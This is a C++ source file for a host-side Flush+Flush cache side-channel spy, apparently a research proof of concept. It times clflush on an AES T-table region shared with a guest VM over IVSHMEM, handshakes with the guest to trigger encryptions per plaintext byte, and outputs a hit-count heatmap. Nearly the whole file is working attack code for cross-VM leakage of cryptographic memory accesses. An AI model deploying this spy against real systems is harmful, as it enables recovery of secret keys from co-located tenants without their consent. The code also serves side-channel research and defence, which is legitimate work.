// host_aes_spy_ff.cpp
// Host-side Flush+Flush Spy targeting IVSHMEM
// v3: Inverted logic (Count SLOW flushes) for vivid heatmap

#include <cstdio>
#include <cstdlib>
#include <cstdint>
#include <cstring>
#include <string>
#include <vector>
#include <cerrno>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sched.h>
#include <time.h>
#include <x86intrin.h>

// ----------------------------------------------------------------------
// Utils
// ----------------------------------------------------------------------

static void pin_to_core(int core) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(core, &set);
    (void)sched_setaffinity(0, sizeof(set), &set);
}

static inline void cpu_relax() { asm volatile("pause" ::: "memory"); }

static inline uint64_t ns_now() {
    timespec ts{};
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ull + (uint64_t)ts.tv_nsec;
}

// Measure cycles taken by clflush
static inline uint64_t flush_cycles(volatile void *p) {
    unsigned aux;
    _mm_mfence();
    uint64_t t1 = __rdtscp(&aux);
    _mm_clflush((const void*)p);
    _mm_mfence();
    uint64_t t2 = __rdtscp(&aux);
    return t2 - t1;
}

// Calibrate: We want to find the boundary between "Fast" (Uncached) and "Slow" (Cached)
static unsigned calibrate_threshold(volatile uint8_t* buffer) {
    volatile uint8_t *target = buffer + 4096; 
    const int N = 10000;
    
    // 1. Measure UNCACHED (Flush then Flush) -> Should be FAST
    uint64_t uncached_sum = 0;
    for (int i = 0; i < N; i++) {
        _mm_clflush((const void *)target);
        uncached_sum += flush_cycles((void *)target);
    }
    unsigned uncached_mean = (unsigned)(uncached_sum / N);

    // 2. Measure CACHED (Access then Flush) -> Should be SLOW
    uint64_t cached_sum = 0;
    for (int i = 0; i < N; i++) {
        (void)*target;  // Load into cache
        cached_sum += flush_cycles((void *)target);
    }
    unsigned cached_mean = (unsigned)(cached_sum / N);

    printf("[host] Calibration: Uncached(Fast)=%u Cached(Slow)=%u\n", uncached_mean, cached_mean);

    // If calibration is noisy and they look swapped, we force a sane default separation
    // But usually Cached > Uncached for clflush.
    if (cached_mean <= uncached_mean) {
        printf("[host] WARNING: Calibration weird (Cached <= Uncached). Using default offset.\n");
        return uncached_mean + 40; // Force a threshold slightly above uncached
    }

    return (uncached_mean + cached_mean) / 2;
}

// ----------------------------------------------------------------------
// Shared Memory Control Structure
// ----------------------------------------------------------------------

struct __attribute__((packed)) Ctrl {
    volatile uint8_t  active;
    volatile uint8_t  pt;
    volatile uint8_t  ready;
    volatile uint8_t  done;
    volatile uint32_t token;
    volatile uint32_t ack;
    volatile uint32_t iters;
    volatile uint32_t finished;
};

static uint32_t make_cookie() {
    timespec ts{};
    clock_gettime(CLOCK_REALTIME, &ts);
    uint32_t x = (uint32_t)ts.tv_nsec ^ (uint32_t)ts.tv_sec ^ (uint32_t)getpid();
    return (x & 0x7fffffff) ? (x & 0x7fffffff) : 1;
}

static bool wait_u32_eq(volatile uint32_t* p, uint32_t v, uint64_t timeout_ns) {
    uint64_t t0 = ns_now();
    while (*p != v) {
        if (ns_now() - t0 > timeout_ns) return false;
        cpu_relax();
    }
    return true;
}

// ----------------------------------------------------------------------
// Main Spy Logic
// ----------------------------------------------------------------------

int main(int argc, char** argv) {
    std::string path = "/dev/shm/ivshmem_ff";
    int core = 3;
    
    size_t ctrl_off = 64;
    size_t te0_off = 0x2000; 
    size_t te0_bytes = 1024; 

    // Increased samples for cleaner signal
    int samples = 20000; 
    uint64_t timeout_ns = 20ull * 1000 * 1000 * 1000; 

    // Add default iterations
    uint32_t target_iters = 5000000;
    
    for (int i = 1; i < argc; i++) {
        std::string arg = argv[i];
        if (arg == "--core" && i + 1 < argc) core = std::atoi(argv[++i]);
        // Add the new argument parser here:
        else if (arg == "--iters" && i + 1 < argc) target_iters = (uint32_t)std::stoul(argv[++i]);

//	if (std::string(argv[i]) == "--core") core = std::atoi(argv[++i]);
    }

    pin_to_core(core);
    printf("[host] pinned to core %d\n", core);

    int fd = open(path.c_str(), O_RDWR);
    if (fd < 0) { perror("open"); return 1; }
    
    struct stat st{};
    fstat(fd, &st);
    size_t map_sz = (size_t)st.st_size;
    uint8_t* base = (uint8_t*)mmap(nullptr, map_sz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    close(fd);
    if (base == MAP_FAILED) { perror("mmap"); return 1; }

    Ctrl* ctrl = (Ctrl*)(base + ctrl_off);
    volatile uint8_t* shared_te0 = (volatile uint8_t*)(base + te0_off);

    // 2. Calibrate
    unsigned threshold = calibrate_threshold(base);
    printf("[host] Selected Threshold: %u\n", threshold);

    // 3. Handshake
    ctrl->done = 0; ctrl->active = 0; ctrl->ack = 0; ctrl->token = 0; ctrl->iters = 0; ctrl->finished = 0;
    __sync_synchronize();
    ctrl->ready = 1;
    __sync_synchronize();

    uint32_t cookie = make_cookie();
    uint32_t cookie_token = 0x80000000u | cookie;
    ctrl->token = cookie_token;
    __sync_synchronize();

    printf("[host] Waiting for guest ack...\n");
    if (!wait_u32_eq(&ctrl->ack, cookie_token, timeout_ns)) {
        fprintf(stderr, "[host] Timed out waiting for guest.\n");
        ctrl->done = 1; return 1;
    }
    printf("[host] Guest connected.\n");
    
    ctrl->token = 0; ctrl->ack = 0; ctrl->finished = 0;
    __sync_synchronize();

    // 4. Attack Loop
    size_t num_probes = te0_bytes / 64; 
    std::vector<std::vector<size_t>> hit_counts(num_probes, std::vector<size_t>(256, 0));

    uint32_t token = 1;

    for (size_t pidx = 0; pidx < num_probes; pidx++) {
        volatile uint8_t* probe_addr = shared_te0 + (pidx * 64);

        for (size_t pt = 0; pt < 256; pt += 16) {
            
            // Tell Guest to run
            ctrl->pt = (uint8_t)pt;
            //ctrl->iters = 5000000; // Let guest run continuously -> orignal
            ctrl->iters = target_iters; // reduced for CKKS
            

	    
	    
	    ctrl->finished = 0;
            __sync_synchronize();
            
            ctrl->token = token;
            __sync_synchronize();

            if (!wait_u32_eq(&ctrl->ack, token, timeout_ns)) goto done_lbl;

            // Spy Measurement
            size_t hits = 0;
            for (int s = 0; s < samples; s++) {
                uint64_t t = flush_cycles((void*)probe_addr);
                
                // INVERTED LOGIC:
                // If t > threshold, the flush was SLOW.
                // SLOW means the data was CACHED (Guest accessed it).
                if (t > threshold) {
                    hits++;
                }
                
                // Small delay to allow Guest to re-access the line
                for(volatile int k=0; k<150; k++); 
            }
            hit_counts[pidx][pt] = hits;

            token++;
            if (!wait_u32_eq(&ctrl->finished, token - 1, timeout_ns)) { }
            
            printf("\r[host] Scanning probe %zu/16 pt %zu : Hits %zu    ", pidx, pt, hits);
            fflush(stdout);
        }
    }
    printf("\n");

    // 5. Output Results
    printf("probe_offset");
    for (size_t pt = 0; pt < 256; pt += 16) printf(",pt_%zu", pt);
    printf("\n");

    for (size_t pidx = 0; pidx < num_probes; pidx++) {
        printf("0x%06zx", pidx * 64);
        for (size_t pt = 0; pt < 256; pt += 16) {
            printf(",%zu", hit_counts[pidx][pt]);
        }
        printf("\n");
    }

done_lbl:
    ctrl->done = 1;
    munmap(base, map_sz);
    return 0;
}
